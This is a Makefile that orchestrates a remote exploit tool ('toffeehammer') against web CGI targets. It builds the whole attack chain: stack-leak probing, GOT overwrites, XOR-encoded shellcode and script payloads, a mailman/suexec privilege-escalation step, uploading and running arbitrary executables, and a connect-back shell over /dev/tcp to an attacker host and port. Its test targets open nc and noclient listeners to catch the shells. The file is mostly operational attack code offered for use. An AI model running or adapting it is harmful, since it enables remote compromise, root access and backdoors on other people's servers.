







MAKEFLAGS = --no-print-directory





TGTNAME ?= $(TGTURL)

TGTNAME := $(subst :,_,$(TGTNAME))
TGTNAME := $(subst /,_,$(TGTNAME))
TGTNAME := $(subst .,_,$(TGTNAME))




ifdef ELEVATE
  EXP_PRIVS = asroot
  UID = 0
else
  EXP_PRIVS = unpriv
  UID =
endif










ifdef DISABLE_PROBE
  TH_OPTIONS_PROBE = 
else
  TH_OPTIONS_PROBE = --probe-get-with-body
endif






FAKE_ARGV ?= /usr/local/apache/bin/httpd





ifdef KILL_PARENT
  KILL_PARENT_OPTION = --kill-parent
endif







TH_DIR = ..

TH_OPTIONS_DICT = --target-exe-dict "$(TH_DIR)/dict"

TH_OPTIONS_OUTPUT = --output-prefix "$(TGTNAME).toffeehammer.$$(date +%s)"







ifdef DISABLE_PYTHON_BASE64
  NO_BASE64_OPTION = --no-base64
endif





XOR_SEED ?= 0x35c3d862
XOR_ROTATE ?= 9





ESCAPE_TYPE ?= all












ifdef TMPF_FD
  SCRIPT_STAGE1_PAYLOAD_FD = $(TMPF_FD)
else
  SCRIPT_STAGE1_PAYLOAD_FD = $$(/usr/bin/find /proc/self/fd -lname "*/tmp*deleted*" 2>/dev/null | /usr/bin/cut -d/ -f5 2>/dev/null)
endif






SCRIPT_STAGE1_PRE_EXEC = sleep 1;
STAGE1_PRE_EXEC = sleep 1;



NASM = ./nasm
ELFEXTRACTOR = ./Elfextractor



GCCFLAGS = -Wall -ansi -pedantic -s








help:
	@( echo 'Usage: make runexisting|runshellscript|connectbacksh|uploadnrun TGTURL=... [TGTNAME=...] [ELEVATE=1] ...'; true )

check_TGTURL:
	@[[ "$(TGTURL)" ]] || ( echo 'TGTURL must be set. Try "make help" for help.'; false )

runexisting runshellscript connectbacksh uploadnrun: check_TGTURL $(TGTNAME).target_options $(TGTNAME).exploit_method
	@[[ -s "$(TGTNAME).target_options" ]] || ( echo 'Error: target options not determined'; false )
	@[[ -s "$(TGTNAME).exploit_method" ]] || ( echo 'Error: exploit method not determined'; false )
	$(MAKE) do_"$@" EXP_METHOD="$(shell cat $(TGTNAME).exploit_method)" TH_OPTIONS_TARGET="$(shell cat $(TGTNAME).target_options)"







test: clean_test test_runexisting test_runshellscript test_uploadnrun test_uploadnrun_nopen test_connectbacksh
	@echo ALL TESTS PASSED SUCCESSFULLY

test_runexisting: clean clean_$(TGTNAME)
	echo 'std in' > "$@.stdin"
	$(MAKE) runexisting TH_OPTIONS_OUTPUT="--output-prefix test_runexisting" FILENAME=/bin/sh STDIN="$@.stdin" ARGV="/bin/sh -c 'cat; id; env'" ENVP="FOO=BAR"
	rm -f "$@.stdin"
	$(MAKE) check_stdin_uid_env TEST="$@"

test_runshellscript: clean clean_$(TGTNAME)
	echo 'echo "std in"; id; FOO=BAR env' > "$@.script"
	$(MAKE) runshellscript TH_OPTIONS_OUTPUT="--output-prefix test_runshellscript" SCRIPT="$@".script
	rm -f "$@.script"
	$(MAKE) check_stdin_uid_env TEST="$@"

test_uploadnrun: clean clean_$(TGTNAME)
	echo 'std in' > "$@.stdin"
	echo 'int main() { system("cat; id; env"); return 0; }' | gcc -x c - -o "$@.exe"
	$(MAKE) uploadnrun TH_OPTIONS_OUTPUT="--output-prefix test_uploadnrun" EXECUTABLE="$@.exe" STDIN="$@.stdin" ARGV= ENVP="FOO=BAR"
	rm -f "$@.exe" "$@.stdin"
	$(MAKE) check_stdin_uid_env TEST="$@"

test_connectbacksh: clean clean_$(TGTNAME)
	echo "id; exit" | nc -lp 7878 &> $@.sh.out &
	$(MAKE) connectbacksh TH_OPTIONS_OUTPUT="--output-prefix test_connectbacksh" US=$(US) PORT=7878
	to=30; while (( $$to > 0 )) && ! grep -q 'uid=' $@.sh.out; do sleep 1; to=$$(( $$to - 1 )); done
	if grep -q 'uid=$(UID)' $@.sh.out; then \
	  rm -f $@.sh.out; \
	  echo "PASS $@"; \
	else \
	  pkill nc; \
	  echo "FAIL $@"; \
	  false; \
	fi

test_uploadnrun_nopen: clean clean_$(TGTNAME)
	noclient -l 7878 -c '-exit' &> $@.no.out &
	$(MAKE) uploadnrun TH_OPTIONS_OUTPUT="--output-prefix test_uploadnrun_nopen" EXECUTABLE="$$(which noserver.static)" STDIN= ARGV= ENVP="D=-c\ $(US):7878"
	to=30; while (( $$to > 0 )) && ! grep -q 'Accepted connection from' $@.no.out; do sleep 1; to=$$(( $$to - 1 )); done
	grep -q 'Accepted connection from' $@.no.out && (rm -f $@.no.out ; echo "PASS $@") || ( pkill noclient ; echo "FAIL $@" ; false )

check_stdin_uid_env:
	grep -q 'std in'  $(TEST).poke_mem.response && \
	grep -q 'uid='    $(TEST).poke_mem.response && \
	grep -q 'FOO=BAR' $(TEST).poke_mem.response && \
	echo "PASS $(TEST)" || ( echo "FAIL $(TEST)" ; false )

clean_test:
	-$(RM) test_runexisting.* test_runshellscript.* test_uploadnrun.*














do_runexisting:
	@[[ "$(FILENAME)" ]] || ( echo 'Usage: make runexisting FILENAME=/path/on/target STDIN= ARGV= ENVP='; false )
	$(MAKE) do_$(EXP_METHOD)_runexisting_$(EXP_PRIVS)








do_runshellscript:
	@[[ "$(SCRIPT)" && -r "$(SCRIPT)" ]] || ( echo 'Usage: make runshellscript SCRIPT=path/to/script'; false )
	$(MAKE) do_$(EXP_METHOD)_runshellscript_$(EXP_PRIVS)











do_connectbacksh:
	@[[ "$(US)" && "$(PORT)" ]]  || ( echo 'Usage: make connectbacksh US=... PORT=...'; false )
	$(MAKE) do_$(EXP_METHOD)_connectbacksh_$(EXP_PRIVS)















do_uploadnrun:
	@[[ "$(EXECUTABLE)" && -r "$(EXECUTABLE)" ]] || ( echo 'Usage: make uploadnrun EXECUTABLE=path/to/exe STDIN=... ARGV=... ENVP=...'; false )
	$(MAKE) do_$(EXP_METHOD)_uploadnrun_$(EXP_PRIVS)












do_shellcode_runexisting_unpriv: clean_stage1 clean_shellcode_fork_exec
	$(MAKE) shellcode_fork_exec.xlle FE_FILENAME="$(FILENAME)" FE_STDIN="$(STDIN)" FE_ARGV="$(ARGV)" FE_ENVP="$(ENVP)"
	$(MAKE) run_toffeehammer_shellcode PAYLOAD=shellcode_fork_exec.xlle



do_shellcode_runshellscript_unpriv:
	$(MAKE) do_shellcode_runexisting_unpriv FILENAME="/bin/sh" STDIN="$(SCRIPT)" ARGV="$(FAKE_ARGV)" ENVP=



do_shellcode_connectbacksh_unpriv: clean_connectbacksh
	$(MAKE) connectback.sh CB_ARGV="$(FAKE_ARGV)" CB_IPADDR="$(US)" CB_PORT="$(PORT)"
	$(MAKE) do_shellcode_runshellscript_unpriv SCRIPT=connectback.sh




do_shellcode_uploadnrun_unpriv: clean_stage1 clean_python_fork_exec
	$(MAKE) python_fork_exec.xlle FE_FILENAME="$(FILENAME)" FE_EXECUTABLE="$(EXECUTABLE)" FE_STDIN="$(STDIN)" FE_ARGV="$(ARGV)" FE_ENVP="$(ENVP)"
	$(MAKE) run_toffeehammer_shellcode PAYLOAD=python_fork_exec.xlle







do_script_runexisting_unpriv: clean_python_fork_exec clean_script_stage2_python
	$(MAKE) python_fork_exec.py FE_FILENAME="$(FILENAME)" FE_STDIN="$(STDIN)" FE_ARGV="$(ARGV)" FE_ENVP="$(ENVP)"
	$(MAKE) script_stage2_python.enc SCRIPT=python_fork_exec.py
	$(MAKE) run_toffeehammer_script_python PAYLOAD=script_stage2_python.enc



do_script_runshellscript_unpriv: clean_script_stage2_shell
	$(MAKE) script_stage2_shell.enc
	$(MAKE) run_toffeehammer_script_shell PAYLOAD=script_stage2_shell.enc



do_script_connectbacksh_unpriv: clean_connectbacksh
	$(MAKE) connectback.sh CB_ARGV="$(FAKE_ARGV)" CB_IPADDR="$(US)" CB_PORT="$(PORT)"
	$(MAKE) do_script_runshellscript_unpriv SCRIPT=connectback.sh





do_script_uploadnrun_unpriv: clean_python_fork_exec clean_script_stage2_python
	$(MAKE) python_fork_exec.py FE_FILENAME="$(FILENAME)" FE_EXECUTABLE="$(EXECUTABLE)" FE_STDIN="$(STDIN)" FE_ARGV="$(ARGV)" FE_ENVP="$(ENVP)"
	$(MAKE) script_stage2_python.enc SCRIPT=python_fork_exec.py
	$(MAKE) run_toffeehammer_script_python PAYLOAD=script_stage2_python.enc

















do_shellcode_runexisting_asroot: clean_stage1 clean_python_fork_exec_elevated
	$(MAKE) python_fork_exec_elevated.xlle FE_FILENAME="$(FILENAME)" FE_STDIN="$(STDIN)" FE_ARGV="$(ARGV)" FE_ENVP="$(ENVP)"
	$(MAKE) run_toffeehammer_shellcode PAYLOAD=python_fork_exec_elevated.xlle



do_shellcode_runshellscript_asroot:
	$(MAKE) do_shellcode_runexisting_asroot FILENAME="/bin/sh" STDIN="$(SCRIPT)" ARGV="$(FAKE_ARGV)" ENVP=



do_shellcode_connectbacksh_asroot: clean_connectbacksh
	$(MAKE) connectback.sh CB_ARGV="$(FAKE_ARGV)" CB_IPADDR="$(US)" CB_PORT="$(PORT)"
	$(MAKE) do_shellcode_runshellscript_asroot SCRIPT=connectback.sh







do_shellcode_uploadnrun_asroot: clean_stage1 clean_python_fork_exec_elevated
	$(MAKE) python_fork_exec_elevated.xlle FE_FILENAME="$(FILENAME)" FE_EXECUTABLE="$(EXECUTABLE)" FE_STDIN="$(STDIN)" FE_ARGV="$(ARGV)" FE_ENVP="$(ENVP)"
	$(MAKE) run_toffeehammer_shellcode PAYLOAD=python_fork_exec_elevated.xlle








do_script_runexisting_asroot: clean_python_fork_exec_elevated clean_script_stage2_shell
	$(MAKE) python_fork_exec_elevated.sh FE_FILENAME="$(FILENAME)" FE_STDIN="$(STDIN)" FE_ARGV="$(ARGV)" FE_ENVP="$(ENVP)"
	$(MAKE) script_stage2_shell.enc SCRIPT=python_fork_exec_elevated.sh
	$(MAKE) run_toffeehammer_script_shell PAYLOAD=script_stage2_shell.enc



do_script_runshellscript_asroot:
	$(MAKE) do_script_runexisting_asroot FILENAME="/bin/sh" STDIN="$(SCRIPT)" ARGV="$(FAKE_ARGV)" ENVP=



do_script_connectbacksh_asroot: clean_connectbacksh
	$(MAKE) connectback.sh CB_ARGV="$(FAKE_ARGV)" CB_IPADDR="$(US)" CB_PORT="$(PORT)"
	$(MAKE) do_script_runshellscript_asroot SCRIPT=connectback.sh






do_script_uploadnrun_asroot: clean_python_fork_exec_elevated
	$(MAKE) python_fork_exec_elevated.sh FE_FILENAME="$(FILENAME)" FE_EXECUTABLE="$(EXECUTABLE)" FE_STDIN="$(STDIN)" FE_ARGV="$(ARGV)" FE_ENVP="$(ENVP)"
	$(MAKE) script_stage2_shell.enc SCRIPT=python_fork_exec_elevated.sh
	$(MAKE) run_toffeehammer_script_shell PAYLOAD=script_stage2_shell.enc














$(TGTNAME).probe.log:
	@echo "Running toffeehammer to determine target options and appropriate exploit method..."
	$(TH_DIR)/toffeehammer $(TH_OPTIONS) $(TH_OPTIONS_DICT) --output-prefix "$(TGTNAME).probe" $(TH_OPTIONS_PROBE) --leak-stack "$(TGTURL)" \
	|| ( echo 'Error: probe failed. If output ($(TGTNAME).probe.*) looks benign, delete "$@" and try again with DISABLE_PROBE=1'; false )   

$(TGTNAME).target_options: $(TGTNAME).probe.log
	@grep -q " Using target options: --" "$<" \
	|| ( echo 'Error: probe failed. If output ($(TGTNAME).probe.*) looks benign, delete "$<" and try again with DISABLE_PROBE=1'; false )
	@sed -ne '/ Using target options: /s/.*: //p' "$<" > "$@"



$(TGTNAME).exploit_method: $(TGTNAME).target_options
	@( grep -q "target-word-size 4" "$<" && echo "shellcode" > "$@" ) || \
	 ( grep -q "target-word-size 8" "$<" && echo "script"    > "$@" ) || \
	 ( echo 'Error: could not determine exploit method from "$<"'; false )







run_toffeehammer_shellcode: stage1_$(XOR_SEED)_$(XOR_ROTATE)_intemplate.bin
	@sleep 1 && echo "Running toffeehammer (W+X stack method, shellcode payload)..."
	$(MAKE) run_toffeehammer_shellcode_wxstack STAGE1=$<



run_toffeehammer_script_shell: ctf_stage1_shell.bin
	@sleep 1 && echo "Running toffeehammer (W^X popen method, shell script payload)..."
	$(MAKE) run_toffeehammer_script_ctf STAGE1=$<
	
run_toffeehammer_script_python: ctf_stage1_python.bin
	@sleep 1 && echo "Running toffeehammer (W^X popen method, python script payload)..."
	$(MAKE) run_toffeehammer_script_ctf STAGE1=$<





























run_toffeehammer_shellcode_wxstack:
	@[[ "$(PAYLOAD)" && -r "$(PAYLOAD)" ]] || ( echo 'Error: PAYLOAD not set or not found.'; false )
	@[[ "$(STAGE1)" && -r "$(STAGE1)" ]] || ( echo 'Error: STAGE1 not set or not found.'; false )
	$(TH_DIR)/toffeehammer $(TH_OPTIONS) $(TH_OPTIONS_DICT) $(TH_OPTIONS_OUTPUT) $(TH_OPTIONS_TARGET) \
	--poke-memory 'addr_popebx_popebp_ret@got.strcmp' \
	--prepend-template "$(PAYLOAD)" --append-template "$(STAGE1)" "$(TGTURL)"








run_toffeehammer_script_ctf:
	@[[ "$(PAYLOAD)" && -r "$(PAYLOAD)" ]] || ( echo 'Error: PAYLOAD not set or not found.'; false )
	@[[ "$(STAGE1)" && -r "$(STAGE1)" ]] || ( echo 'Error: STAGE1 not set or not found.'; false )
	$(TH_DIR)/toffeehammer $(TH_OPTIONS) $(TH_OPTIONS_DICT) $(TH_OPTIONS_OUTPUT) $(TH_OPTIONS_TARGET) \
	--poke-memory 'plt.popen@got.fopen' \
	--poke-memory 'cgi_template_fill+12@got.__xstat' \
	--poke-memory 'wrap_xstat@got.getenv' \
	--prepend-template "$(PAYLOAD)" --append-template "$(STAGE1)" "$(TGTURL)"










run_toffeehammer_script_strcmp_popen:
	@echo Not implemented.



















clean_stage1:
	










	




clean_stage1_intemplate:
	













clean_shellcode:
	



















ctf_stage1_shell.bin:
	echo -n '[$$$(SCRIPT_STAGE1_PRE_EXEC)exec $$0<&$(SCRIPT_STAGE1_PAYLOAD_FD) 2>&1]' > "$@"

clean_ctf_stage1_shell:
	-$(RM) ctf_stage1_shell.bin





ctf_stage1_python.bin:
	echo -n '"""[$$$(STAGE1_PRE_EXEC)exec /usr/bin/python<&$(SCRIPT_STAGE1_PAYLOAD_FD) 2>&1]' > "$@"

clean_ctf_stage1_python:
	-$(RM) ctf_stage1_python.bin











script_stage2_shell.bin:
	echo 'echo [failure]'         > "$@"
	
	cat "$(SCRIPT)"              >> "$@"
	
	echo                         >> "$@"
	echo 'exit'                  >> "$@"

clean_script_stage2_shell:
	-$(RM) script_stage2_shell{.bin,.enc}














script_stage2_python.bin:
	echo 'print "[failure]"'      > "$@"
	
	echo 'import os'             >> "$@"
	echo 'try:'                  >> "$@"
	echo '  os.lseek(0,0,0)'     >> "$@"
	echo '  os.ftruncate(0,0)'   >> "$@"
	echo 'except:'               >> "$@"
	echo '  pass'                >> "$@"
	
	cat "$(SCRIPT)"              >> "$@"
	
	echo                         >> "$@"
	echo '"""'                   >> "$@"

clean_script_stage2_python:
	-$(RM) script_stage2_python{.bin,.enc}


















	
clean_fork_exec:
	




shellcode_fork_exec.bin:
	./prepare_shellcode_fork_exec $(KILL_PARENT_OPTION) --filename "$(FE_FILENAME)" --stdin "$(FE_STDIN)" --argv $(FE_ARGV) --envp $(FE_ENVP) > "$@"

clean_shellcode_fork_exec:
	-$(RM) shellcode_fork_exec{.bin,.xlle}






python_fork_exec.py:
	./prepare_python_fork_exec $(VIA_SUEXEC_OPTION) $(NO_BASE64_OPTION) --filename "$(FE_FILENAME)" --executable "$(FE_EXECUTABLE)" --stdin "$(FE_STDIN)" --argv $(FE_ARGV) --envp $(FE_ENVP) > "$@"

python_fork_exec.bin: python_fork_exec.py
	./prepare_shellcode_fork_exec $(KILL_PARENT_OPTION) --filename "/usr/bin/python" --stdin python_fork_exec.py --argv "$(FAKE_ARGV)" > "$@"
	
clean_python_fork_exec:
	-$(RM) python_fork_exec{.py,.sh,.bin,.xlle}





python_fork_exec_elevated.sh:
	$(MAKE) python_fork_exec.py VIA_SUEXEC_OPTION=--via-suexec
	./prepare_mailman_privesc --python-script python_fork_exec.py > "$@"

python_fork_exec_elevated.bin: python_fork_exec_elevated.sh
	./prepare_shellcode_fork_exec $(KILL_PARENT_OPTION) --filename "/bin/sh" --stdin python_fork_exec_elevated.sh --argv "$(FAKE_ARGV)" > "$@"
	
clean_python_fork_exec_elevated: clean_python_fork_exec
	-$(RM) python_fork_exec_elevated{.py,.sh,.bin,.xlle}






connectback.sh:
	echo "exec -a ${CB_ARGV} /bin/sh </dev/tcp/${CB_IPADDR}/${CB_PORT} >&0 2>&0 &" > "$@"
clean_connectbacksh:
	-$(RM) connectback.sh









%.enc: %.bin 
	./prepare_cgiemail_payload --escape-type "$(ESCAPE_TYPE)" < "$<" > "$@"




%.xlle: %.bin
	./prepare_cgiemail_payload --xor-seed "$(XOR_SEED)" --xor-rotate "$(XOR_ROTATE)" < "$<" | \
	./prepare_cgiemail_payload --prepend-length | \
	./prepare_cgiemail_payload --prepend-length | \
	./prepare_cgiemail_payload --escape-type "$(ESCAPE_TYPE)" > "$@"






























trigger_strcmp:
	echo -n '[x]' > "$@"
clean_trigger_strcmp:
	-$(RM) trigger_strcmp









clean: \
	clean_stage1 \
	clean_stage1_intemplate \
	clean_shellcode \
	clean_ctf_stage1_shell \
	clean_ctf_stage1_python \
	clean_script_stage2_shell \
	clean_script_stage2_python \
	clean_fork_exec \
	clean_shellcode_fork_exec \
	clean_python_fork_exec \
	clean_python_fork_exec_elevated \
	clean_connectbacksh \
	clean_trigger_strcmp










clean_$(TGTNAME):
	rm -f $(TGTNAME).*


clean_all: clean clean_test clean_$(TGTNAME)
	
